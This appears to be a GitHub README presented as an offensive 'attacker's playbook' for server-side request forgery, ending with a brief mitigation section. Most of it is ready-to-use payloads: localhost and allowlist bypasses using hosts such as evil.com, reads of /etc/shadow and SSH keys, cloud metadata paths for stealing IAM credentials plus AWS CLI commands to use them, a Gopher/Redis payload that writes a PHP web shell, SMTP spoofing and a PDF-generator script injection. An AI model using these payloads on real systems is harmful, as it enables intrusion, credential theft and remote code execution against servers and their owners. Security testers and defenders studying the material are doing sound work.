<div align="center">

# 🛡️ SSRF — Complete Attacker's Playbook

**Server-Side Request Forgery** | From Detection to Full Exploitation

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
![Category](https://img.shields.io/badge/Category-Web%20Security-red)
![Type](https://img.shields.io/badge/Type-Offensive%20Security-orange)
![Difficulty](https://img.shields.io/badge/Difficulty-Intermediate%20→%20Advanced-blue)

> ⚠️ **For authorized security testing and educational purposes only.**

</div>

---

## 📋 Table of Contents

| # | Section |
|---|---------|
| 1 | [Detection & Methodology](#-detection--methodology) |
| 2 | [URL & IP Bypasses](#-url--ip-bypasses) |
| 3 | [Protocol Testing](#-protocol-testing) |
| 4 | [Filter Bypasses](#-filter-bypasses) |
| 5 | [Port Scanning via SSRF](#-port-scanning-via-ssrf) |
| 6 | [Bypass Techniques](#-bypass-techniques) |
| 7 | [SSRF via PDF Generators](#-ssrf-via-pdf-generators) |
| 8 | [Second-Order SSRF](#-second-order-ssrf) |
| 9 | [SSRF via DNS Rebinding](#-ssrf-via-dns-rebinding) |
| 10 | [Cloud Metadata Exploitation](#-cloud-metadata-exploitation) |
| 11 | [Internal Service Exploitation](#-internal-service-exploitation) |
| 12 | [Local File Access & Data Exfiltration](#-local-file-access--data-exfiltration) |
| 13 | [Tools & Automation](#-tools--automation) |
| 14 | [Mitigation](#-ssrf-mitigation) |

---

## 🔍 Detection & Methodology

### Step 1 — Identify Vulnerable Parameters

Look for any parameter that accepts a URL or hostname:

```
https://site.com/fetch?url=https://example.com
https://site.com/proxy?target=https://example.com
https://site.com/image?src=https://example.com/image.jpg
https://site.com/api/webhook?callback=https://example.com/hook
```

**Common parameter names to hunt:**

| Category | Names |
|----------|-------|
| URL input | `url`, `uri`, `path`, `dest`, `destination` |
| Navigation | `redirect`, `target`, `link`, `nav` |
| Callbacks | `callback`, `webhook`, `fetch` |

---

### Step 2 — Verify with a Controlled Server

```bash
# Start a listener on your server
python3 -m http.server 8000

# Send the test payload
https://site.com/fetch?url=http://your-server.com:8000/test
```

> ✅ If you see an incoming request in your server logs → **SSRF confirmed**

Alternatively, use **Burp Collaborator**:

```
url=http://BURP-COLLABORATOR-SUBDOMAIN
```
Check Collaborator for DNS queries or HTTP interactions — either confirms SSRF.

---

### Step 3 — Test Internal Access

```
https://site.com/fetch?url=http://localhost/
https://site.com/fetch?url=http://127.0.0.1/
https://site.com/fetch?url=http://0.0.0.0/
```

---

### Step 4 — Full Exploitation Workflow

```
Step 1: Find a functionality that fetches a URL
        (profile pictures, webhooks, link previews, PDF invoices)
        ↓
Step 2: Manipulate the input
        → Use internal IP: http://192.168.0.1
        → Watch for unusual errors, timeouts, or behavioural changes
        ↓
Step 3: Confirm with external server
        → Use https://webhook.site or Burp Collaborator
        → Incoming connection = confirmed SSRF
        ↓
Step 4: Exploit
        → Hit internal services: http://192.168.0.2:8080
        → Read cloud metadata: http://169.254.169.254/
        → Read local files: file:///etc/passwd
```

---

## 🌐 URL & IP Bypasses

### Localhost Aliases

```
http://127.0.0.1
http://127.1                    # Shorthand
http://0.0.0.0
http://localhost
http://127.00.00.01
http://2130706433               # Decimal IP for 127.0.0.1
http://0x7f000001               # Hex IP
http://0x7f.0x0.0x0.0x1        # Hex IP (dotted)
http://0177.0000.0000.0001      # Octal IP
http://[::1]                    # IPv6 loopback
http://[::ffff:127.0.0.1]       # IPv4-mapped IPv6
```

### Internal IP Ranges

```
http://192.168.0.1
http://192.168.1.1
http://10.0.0.1
http://172.16.0.1
```

### IPv6 Variants

```
http://[::1]/
http://[0:0:0:0:0:0:0:1]/
http://[0000:0000:0000:0000:0000:0000:0000:0001]/
http://[fe80::1]/
http://[fe80::]/
```

---

## 📡 Protocol Testing

### File Protocol

```
file:///etc/passwd
file:///etc/hosts
file:///etc/shadow
file:///c:/windows/win.ini
file://\/\/etc/passwd
```

### Dict Protocol (Redis / Memcached)

```
dict://127.0.0.1:6379/info
dict://127.0.0.1:11211/stats
```

### Gopher Protocol (Raw TCP)

```
gopher://127.0.0.1:6379/_INFO
gopher://127.0.0.1:3306/
```

### LDAP Protocol

```
ldap://127.0.0.1:389/
ldap://localhost:389/%0astats%0aquit
```

### FTP Protocol

```
ftp://127.0.0.1/
ftp://user:pass@internal-ftp/file.txt
```

### Protocol Case Variation & Smuggling

```
HTTP://127.0.0.1/
hTTp://127.0.0.1/
HtTp://127.0.0.1/
//127.0.0.1/          # Missing protocol
//localhost/
http://localhost#@evil.com    # Parser confusion
```

### When `http://` is Blocked — Protocol Swap

```
https://127.0.0.1/
ftp://127.0.0.1/
file:///etc/passwd
dict://127.0.0.1:6379/info
gopher://127.0.0.1:6379/_INFO
ldap://127.0.0.1:389/
tftp://127.0.0.1:69/
```

---

## 🛡️ Filter Bypasses

### URL Encoding

```
http://127.0.0.1/   →   http://%31%32%37%2e%30%2e%30%2e%31/
http://localhost/   →   http://%6c%6f%63%61%6c%68%6f%73%74/
```

> Also try: double encoding, unicode normalization

### `@` Symbol Abuse

```
http://evil.com@127.0.0.1/
http://allowed.com@127.0.0.1/
http://allowed.com#@127.0.0.1/
```

### Subdomain & Domain Tricks

```
http://127.0.0.1.evil.com
http://127.0.0.1.nip.io/
http://127.0.0.1.xip.io/
http://127.0.0.1.sslip.io/
http://127.0.0.1.allowed-domain.com/
http://allowed-domain.com.127.0.0.1.nip.io/
http://127.0.0.1.com/
http://localhost.com/
```

### Unicode / IDN Bypass

```
http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ/
http://127.0.0.①/
```

### Port Bypass

```
http://127.0.0.1:80@allowed.com/
http://127.0.0.1:3306@allowed.com/
http://allowed.com#@127.0.0.1:22/
http://127.0.0.1:80:8080/
http://127.0.0.1::8080/
```

### Open Redirect Chain

```
# If allowed-domain.com has an open redirect:
http://allowed-domain.com/redirect?url=http://169.254.169.254/

# Host your own redirect:
# 1. Point SSRF at your server
http://your-server.com/redirect-to-metadata

# 2. Your server responds with:
Location: http://169.254.169.254/latest/meta-data/
```

### Bypassing Hostname Allowlists (Canary Token Payloads)

Replace `{CANARY_TOKEN}` with your controlled hostname. Replace `example.com` with the whitelisted host.

```
.{CANARY_TOKEN}
@{CANARY_TOKEN}
example.com.{CANARY_TOKEN}
example.com@{CANARY_TOKEN}
example.comx.{CANARY_TOKEN}
{CANARY_TOKEN}#example.com
{CANARY_TOKEN}?example.com
{CANARY_TOKEN}#@example.com
{CANARY_TOKEN}?@example.com
127.0.0.1.nip.io
example.com.127.0.0.1.nip.io
127.1
localhost.me
```

### Bypassing Protocol Allowlists

Replace `{CANARY_TOKEN}` with your controlled hostname:

```
//{CANARY_TOKEN}
\\{CANARY_TOKEN}
////{CANARY_TOKEN}
\\\\{CANARY_TOKEN}
http:{CANARY_TOKEN}
https:{CANARY_TOKEN}
/%00/{CANARY_TOKEN}
/%0A/{CANARY_TOKEN}
/%OD/{CANARY_TOKEN}
/%09/{CANARY_TOKEN}
```

> **How these bypasses work:**
> 1. **Regex bypass** — loosely scoped patterns can be matched and tricked
> 2. **Redirect bypass** — if the fetching function follows redirects, redirect to any forbidden host
> 3. **DNS rebinding** — flip DNS between check and use (see [DNS Rebinding](#-ssrf-via-dns-rebinding))

---

## 🔌 Port Scanning via SSRF

Use SSRF to map internal services. Differences in response time, error messages, or body indicate open vs. closed ports.

| Payload | Service |
|---------|---------|
| `http://127.0.0.1:22` | SSH |
| `http://127.0.0.1:80` | HTTP |
| `http://127.0.0.1:443` | HTTPS |
| `http://127.0.0.1:3306` | MySQL |
| `http://127.0.0.1:5432` | PostgreSQL |
| `http://127.0.0.1:6379` | Redis |
| `http://127.0.0.1:8080` | Alt HTTP |
| `http://127.0.0.1:9200` | Elasticsearch |
| `http://127.0.0.1:11211` | Memcached |

---

## 📄 SSRF via PDF Generators

### How It Works

Many web apps generate PDFs from user input (invoices, receipts, reports). These generators often use an HTML-to-PDF library that **renders HTML like a browser**. If your input is unsanitized, injected HTML/JS executes **on the server**, making internal HTTP requests and embedding the response in your downloaded PDF.

```
You type malicious HTML as input (e.g. in invoice name field)
        ↓
App passes it unsanitized to the PDF generator
        ↓
Generator renders it like a browser — executes your code
        ↓
Your code makes HTTP requests FROM THE SERVER
        ↓
Internal response gets embedded in the PDF
        ↓
You download the PDF and read the stolen data 🎉
```

---

### iframe Method

```html
<iframe src="http://localhost/"></iframe>
```

> The iframe loads the internal page *inside* the PDF. The generator fetches `localhost` on your behalf and bakes the response into the document.

---

### JavaScript XMLHttpRequest Method

```html
<script>
  var x = new XMLHttpRequest();
  x.onload = function(){ document.write(this.responseText) };
  x.open('GET', 'http://127.0.0.1');
  // Swap target for local files:
  // x.open('GET', 'file:///etc/passwd');
  // Or cloud metadata:
  // x.open('GET', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/');
  x.send();
</script>
```

**The request originates from the server itself** — firewalls see it as internal traffic and don't block it.

---

### Escalation Path

```
HTML Injection in PDF input field
        ↓
SSRF — read internal services / files
        ↓
Target: http://169.254.169.254/  → steal cloud IAM credentials
Target: file:///etc/passwd       → read system files
Target: http://192.168.x.x/     → pivot into internal network
        ↓
⚠️  If generator runs headless Chromium (no sandbox + root privileges)
        ↓
Remote Code Execution on the server
```

> 💡 **Why Chromium matters:** Some PDF generators spawn a headless Chromium instance to render HTML. If it runs without sandbox protection and as root, JavaScript can escape the browser context and interact with the OS — turning SSRF into full RCE.

---

## 🔄 Second-Order SSRF

### The Key Difference

| Regular SSRF | Second-Order SSRF |
|---|---|
| Payload → server makes request **immediately** | Payload saved → triggered **later** by an internal process |
| Easy to detect with scanners | Often missed — input and trigger are in separate requests |

### How It Works

Your malicious input is **stored in the database** first, then later **retrieved and passed to an internal API** that makes the actual HTTP request.

```
You (attacker)          External API          Internal API / Background Job
     │                       │                           │
     │── Save evil URL ──────▶│                           │
     │                       │── stores in DB            │
     │                       │                           │
     │         [time passes — hours, days, cron job]     │
     │                       │                           │
     │                  background job runs              │
     │                       │── passes stored URL ─────▶│
     │                       │                           │── fetches it
     │                       │◀── returns response ──────│
     │◀── you see the data ──│                           │
```

### Scenario — Profile Website URL

**Step 1 — Enter malicious URL in profile settings:**
```
Profile Website: http://internal-api.company.com/admin/users
```
Nothing happens. App saves it silently.

**Step 2 — Background job runs (e.g. nightly thumbnail generator):**
```
Internal API receives:
→ "Generate a preview for http://internal-api.company.com/admin/users"
→ Internal API blindly fetches it (trusts anything from the external API)
→ Response stored as your "website preview"
```

**Step 3 — You check your profile:**
```
Your "website preview thumbnail" now contains
the full response of the internal admin endpoint 🔓
```

### Why It's Dangerous

The internal API assumes it's only ever called by **trusted internal services** — so it skips auth checks entirely. You just need to poison the data once.

> 💡 **Mental model:** The external API is a receptionist who takes your message and passes it to a trusted colleague in the back office. That colleague never questions anything the receptionist hands them — so you just need to sneak a bad note past the front desk once.

### Where to Look for Second-Order SSRF

```
✔ Profile fields       — website URL, avatar URL, social links
✔ Webhook URLs         — anything you register for callbacks
✔ Import features      — "import from URL", RSS feeds
✔ Notification URLs    — any stored callback endpoint
✔ Any stored field     — that later gets fetched or processed by the app
```

---

## 🔁 SSRF via DNS Rebinding

### The Core Concept — TOCTOU

**Time of Check, Time of Use** — the app validates a hostname at one moment, but the actual HTTP connection happens at a *different* moment. Your attack lives in that gap.

```
[DNS Check / Validation] ─────── gap ─────── [Actual HTTP Request]
                                   ↑
                          flip DNS here
```

### How DNS Rebinding Works

**Setup:** Register `evil.com` with your own DNS server. Set TTL = **0** (forces a fresh DNS query every time, no caching).

```
Step 1 — App checks your domain (VALIDATION)
         App asks DNS: "What IP is evil.com?"
         Your DNS responds: "93.184.216.34"  ← a legitimate, whitelisted IP
         ✅ Validation passes

Step 2 — You immediately flip your DNS record
         evil.com → 127.0.0.1  (localhost)

Step 3 — App makes the actual HTTP request (USE)
         App asks DNS again: "What IP is evil.com?"
         Your DNS now responds: "127.0.0.1"
         App connects to 127.0.0.1
         — thinking it's still the safe, validated host
```

### Visual Timeline

```
You submit evil.com
        ↓
App validates ──► DNS says "93.184.216.34" (safe) ──► ✅ PASS
        ↓
   [milliseconds pass]
        ↓
You flip DNS ──► evil.com now → 127.0.0.1
        ↓
App fetches URL ──► asks DNS again ──► gets 127.0.0.1
        ↓
App hits internal server thinking it's the validated host
        ↓
Response returned / embedded to you 🎉
```

### Real-World Scenario

**Target:** Social media app with link preview generation.

| Step | Action |
|------|--------|
| Set preview URL to `http://evil.com/preview` | App queues the fetch |
| App validates → your DNS returns whitelisted IP | ✅ Passes |
| You flip DNS to `169.254.169.254` | AWS metadata endpoint |
| App generates preview → DNS queried again → flipped IP returned | App hits metadata |
| Preview stores the response | IAM credentials inside 🔑 |

### Why This Works

The app made a fatal assumption:

> *"The IP I validated will be the same IP I connect to."*

DNS is not frozen in time. With TTL=0, every query can return a **different answer**.

### Why Developers Get This Wrong

A common but flawed pattern:

```
1. Resolve provided hostname → get IP
2. Check if IP is internal → if yes, BLOCK
3. Otherwise, send request to hostname ← BUG: resolves DNS AGAIN
```

The IP is fetched **twice**. Between check and use, DNS can flip.

### DNS Rebinding Tools

| Tool | Use |
|------|-----|
| [whonow](https://github.com/brannondorsey/whonow) | Custom DNS server built for rebinding |
| [rbndr.us](http://rbndr.us) | Public DNS rebinding testing service |
| [singularity](https://github.com/nccgroup/singularity) | Full DNS rebinding attack framework |

> 💡 **Mental model:** A bouncer checks your ID at the door ✅ — but by the time you walk in, you've swapped clothes with someone on the banned list. The bouncer only checked once and assumed nothing changed. DNS rebinding = swapping identities between the check and the entry.

---

## ☁️ Cloud Metadata Exploitation

### AWS

```bash
# Step 1 — List available IAM roles
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Step 2 — Extract role credentials
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE-NAME]

# Step 3 — Additional endpoints
http://169.254.169.254/latest/user-data                              # May contain secrets
http://169.254.169.254/latest/dynamic/instance-identity/document     # Instance info
```

**Credential response:**
```json
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "..."
}
```

**Use stolen credentials with AWS CLI:**
```bash
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

aws s3 ls
aws ec2 describe-instances
aws iam get-user
```

### Azure

```
# Access token
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

### Google Cloud

> Requires header: `Metadata-Flavor: Google`

```
# Service account token
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# SSH keys
http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys
```

---

## ⚙️ Internal Service Exploitation

### Redis via Gopher — Write a Web Shell

```
gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/www/html
gopher://127.0.0.1:6379/_CONFIG%20SET%20dbfilename%20shell.php
gopher://127.0.0.1:6379/_SET%20shell%20"<?php%20system($_GET['cmd']);%20?>"
gopher://127.0.0.1:6379/_SAVE
```

**Full Gopher/Redis payload (raw, then URL-encode for SSRF parameter):**

```
gopher://127.0.0.1:6379/_
*3
$3
SET
$5
shell
$30
<?php system($_GET['cmd']); ?>

*4
$6
CONFIG
$3
SET
$3
dir
$13
/var/www/html

*4
$6
CONFIG
$3
SET
$10
dbfilename
$9
shell.php

*1
$4
SAVE
```

### Memcached via Gopher

```
gopher://127.0.0.1:11211/_stats
gopher://127.0.0.1:11211/_get%20admin_password
```

### MySQL via Gopher

```
gopher://127.0.0.1:3306/_[MYSQL_PROTOCOL_PAYLOAD]
```

### SMTP via Gopher — Send Spoofed Email

```
gopher://127.0.0.1:25/_HELO%20attacker
gopher://127.0.0.1:25/_MAIL%20FROM:attacker@evil.com
gopher://127.0.0.1:25/_RCPT%20TO:victim@target.com
gopher://127.0.0.1:25/_DATA
gopher://127.0.0.1:25/_Subject:%20SSRF%20Test
```

---

## 📁 Local File Access & Data Exfiltration

### Linux System Files

```
file:///etc/passwd
file:///etc/hosts
file:///etc/shadow
file:///proc/self/environ       # Environment variables
file:///proc/self/cmdline       # Command line arguments
file:///proc/self/cwd/config.php # CWD relative files
```

### Windows System Files

```
file:///c:/windows/win.ini
file:///c:/windows/system32/drivers/etc/hosts
file:///c:/boot.ini
```

### Application & Config Files

```
file:///var/www/html/config.php
file:///var/www/.env
file:///home/user/.ssh/id_rsa
file:///etc/nginx/nginx.conf
```

### AWS Credentials on Disk

```
file:///home/ubuntu/.aws/credentials
file:///root/.aws/credentials
```

---

## 🛠️ Tools & Automation

### SSRFMap

```bash
# Basic file read
python3 ssrfmap.py -r request.txt -p url -m readfiles

# AWS metadata extraction
python3 ssrfmap.py -r request.txt -p url -m aws

# Port scanning through SSRF
python3 ssrfmap.py -r request.txt -p url -m portscan

# Redis exploitation
python3 ssrfmap.py -r request.txt -p url -m redis
```

### Nuclei

```bash
# Run all SSRF templates
nuclei -u https://target.com -t ssrf/

# Specific parameter check
nuclei -u https://target.com -t ssrf/ssrf-parameter.yaml

# Cloud metadata checks
nuclei -u https://target.com -t ssrf/aws-metadata.yaml
```

---

## 🔒 SSRF Mitigation

### Recommended Defenses

**1. Only Allow External Requests**

Whitelist external IPs and block all internal ranges:

```
✅ Allow: 159.65.138.192
❌ Block: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16, 127.0.0.0/8
```

**2. Validate Resolved IP — Not Just Hostname**

Always resolve the hostname to an IP and validate *that IP* before making the request. Do not trust the hostname string alone.

**3. Re-validate After Resolution — Avoid TOCTOU**

```
❌ Flawed pattern:
   1. Resolve hostname → get IP
   2. Check if IP is internal → block if yes
   3. Send request to hostname ← resolves DNS AGAIN (vulnerable to rebinding)

✅ Safe pattern:
   1. Resolve hostname → get IP
   2. Validate IP against blocklist
   3. Send request directly to the IP (not hostname)
      → Never resolve DNS a second time
```

**4. Watch Out For:**

| Risk | Mitigation |
|------|-----------|
| Hostname resolves to internal IP | Always check the resolved IP, not just the hostname string |
| Open redirect on allowed domain | Validate final destination after following redirects |
| DNS rebinding between check and use | Connect using the resolved IP directly, never re-resolve |
| Protocol smuggling | Allowlist only `http://` and `https://` schemes |

---

<div align="center">

---

**Made for educational and authorized security testing purposes only.**

*Use responsibly. Always get written permission before testing.*

</div>